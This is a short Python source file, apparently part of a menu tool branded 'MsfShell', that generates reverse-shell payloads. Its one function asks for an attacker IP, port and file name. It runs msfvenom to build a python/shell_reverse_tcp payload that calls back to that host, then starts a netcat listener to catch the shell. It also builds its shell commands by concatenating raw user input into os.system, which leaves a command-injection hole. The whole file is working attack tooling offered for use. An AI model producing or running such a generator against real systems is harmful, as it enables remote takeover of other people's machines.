import os

banner="""

 /'\_/`\          /'___\ 
/\      \    ____/\ \__/ 
\ \ \__\ \  /',__\ \ ,__|
 \ \ \_/\ \/\__, `\ \ \_/                 
  \ \_\\ \_\/\____/\ \_\ 
   \/_/ \/_/\/___/  \/_/ 

/\  _`\ /\ \            /\_ \  /\_ \     
\ \,\L\_\ \ \___      __\//\ \ \//\ \    
 \/_\__ \\ \  _ `\  /'__`\\ \ \  \ \ \   
   /\ \L\ \ \ \ \ \/\  __/ \_\ \_ \_\ \_ 
   \ `\____\ \_\ \_\ \____\/\____\/\____|
    \/_____/\/_/\/_/\/____/\/____/\/____/

"""

def li_net_py():
    os.system("clear")
    print(banner)
    print("Using: python/shell_reverse_tcp")
    ip = input("Attacker IP: ")
    port = input("Listen Port: ")
    name = input("Name for the python file: ")
    print("Ok!")
    print("+--------------------------------------------+ ")
    print("+-> Payload data")
    print("+-> Payload: python/shell_reverse_tcp")
    print("+-> Attacker IP: "+ip+"")
    print("+-> Listen Port: "+port+"")
    print("+-> Name: "+name+"")
    print("+--------------------------------------------+ ")
    print("Creating payload [01]")
    os.system("msfvenom -p python/shell_reverse_tcp LHOST="+ip+" LPORT="+port+" > "+name+".py")
    print("Payload created! [01]")
    print("Saved in: "+name+".py")
    print("Running NetCat Listener...")
    os.system("gnome-terminal -- nc -nlvp "+port+"")
    input("Enter to return to the menu! ")
    os.system("clear")